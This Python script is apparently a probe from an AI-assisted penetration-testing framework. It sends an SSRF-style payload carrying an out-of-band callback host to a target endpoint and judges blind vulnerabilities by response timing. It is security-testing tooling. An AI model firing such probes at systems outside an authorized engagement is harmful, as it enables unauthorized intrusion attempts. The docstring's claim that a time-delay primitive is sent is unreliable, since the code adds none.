#!/usr/bin/env python3
"""Reusable probe: blind out-of-band callback + timing fallback.

For blind vulnerability classes (SSRF, blind XXE, command injection, blind SQLi)
the response body says nothing — the signal is an out-of-band hit, or, when OOB
egress is blocked, a measurable time delay. This probe fires a crafted payload
carrying a minted OOB callback host and a time-delay primitive, then reports a
timing verdict; the authoritative OOB correlation happens on the HOST with
`vigil oob poll` (the callback URL the probe receives is already nonce-tagged).

Bespoke logic (mint-carry, timing measurement, dual-signal verdict) that no typed
`kali` verb expresses — see agent/skills/write-probe-script/SKILL.md. Stdlib-only.

Two-step usage (mint on the HOST first — mint binds the nonce under your running
client's interactsh id and prints the full host as $OOB_HOST; pass that EXACT host
in, never a hand-built bare <nonce>.oob... host, or poll cannot correlate it):
  vigil oob status --json
  vigil oob mint --client <your-client-name> --technique ssrf --target-url https://t/fetch --param url
  # -> host  <nonce>.<client-id>.oob.example.com   (= $OOB_HOST)

  vigil assess kali exec \\
    --technique SSRF --intent "blind SSRF via url param, oob + timing" \\
    --probe-kind payload --phase consume-test --timeout 120 -- \\
    python3 /engagements/$ENGAGEMENT_KEY/scripts/blind_callback_timing.py \\
      --target "https://t/fetch" --param url \\
      --callback "http://$OOB_HOST/ssrf-probe" \\
      --baseline-url "https://t/fetch?url=http://127.0.0.1:1/" \\
      --out /engagements/$ENGAGEMENT_KEY/scans/ssrf_blind.json

  # Then correlate the callback (nonce <-> probe) on the HOST (same client):
  vigil oob poll --client <your-client-name>

Output contract: the LAST stdout line is the JSON verdict
  {"finding": bool, "summary": str, "evidence": {...}}.
`finding` here reflects the TIMING signal only; treat an `vigil oob poll` hit on
the minted nonce as the stronger, authoritative confirmation.
"""
import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def timed_get(url: str, *, timeout: int) -> tuple[int | None, int]:
    """GET `url`; return (status_or_None, latency_ms). Timeouts are signal, not errors."""
    req = urllib.request.Request(url, headers={"User-Agent": "vigil-probe"})
    started = time.monotonic()
    status: int | None = None
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 (scoped target)
            resp.read(1024)
            status = resp.status
    except urllib.error.HTTPError as exc:
        status = exc.code
    except (urllib.error.URLError, TimeoutError):
        # A timeout is exactly the delay we are probing for — record it as the
        # full budget rather than discarding the measurement.
        status = None
    latency_ms = int((time.monotonic() - started) * 1000)
    return status, latency_ms


def main() -> int:
    ap = argparse.ArgumentParser(description="Blind OOB callback + timing probe.")
    ap.add_argument("--target", required=True, help="Endpoint that fetches/parses the injected value.")
    ap.add_argument("--param", default="url", help="Parameter that carries the payload.")
    ap.add_argument(
        "--callback",
        required=True,
        help="The EXACT minted callback URL from `vigil oob mint --client <name>` (http://<nonce>.<client-id>.oob.../). "
        "The nonce bound under the client id is the correlation token; do not hand-build a bare <nonce>.oob... host.",
    )
    ap.add_argument(
        "--baseline-url",
        default="",
        help="A control request (no delay primitive) to measure baseline latency. "
        "Defaults to --target with the callback as the param value.",
    )
    ap.add_argument(
        "--delay-seconds",
        type=int,
        default=5,
        help="Delay the time-based primitive should induce (for the timing verdict threshold).",
    )
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--out", default="")
    args = ap.parse_args()

    # OOB-bearing request: the target should resolve/fetch the callback host.
    oob_url = f"{args.target}?{urllib.parse.urlencode({args.param: args.callback})}"
    baseline_url = args.baseline_url or oob_url

    base_status, base_ms = timed_get(baseline_url, timeout=args.timeout)
    oob_status, oob_ms = timed_get(oob_url, timeout=args.timeout)

    # Timing verdict: a delay primitive that actually fired pushes oob_ms well
    # above baseline. The threshold is half the requested delay to tolerate
    # network jitter while still distinguishing a real induced delay.
    threshold_ms = (args.delay_seconds * 1000) // 2
    delta_ms = oob_ms - base_ms
    finding = delta_ms >= threshold_ms

    summary = (
        f"timing signal: baseline={base_ms}ms oob={oob_ms}ms (Δ{delta_ms}ms, "
        f"threshold {threshold_ms}ms) — {'DELAY OBSERVED' if finding else 'no delay'}. "
        f"Correlate the OOB callback with `vigil oob poll` for authoritative proof."
    )
    result = {
        "finding": finding,
        "summary": summary,
        "evidence": {
            "callback_host": urllib.parse.urlparse(args.callback).netloc,
            "baseline_ms": base_ms,
            "oob_ms": oob_ms,
            "delta_ms": delta_ms,
            "threshold_ms": threshold_ms,
            "baseline_status": base_status,
            "oob_status": oob_status,
            "note": "OOB poll on the minted nonce is the stronger signal than timing.",
        },
    }
    if args.out:
        os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(result, fh, indent=2)
    print(json.dumps(result, ensure_ascii=False))  # verdict is the LAST line
    return 0 if finding else 1


if __name__ == "__main__":
    sys.exit(main())
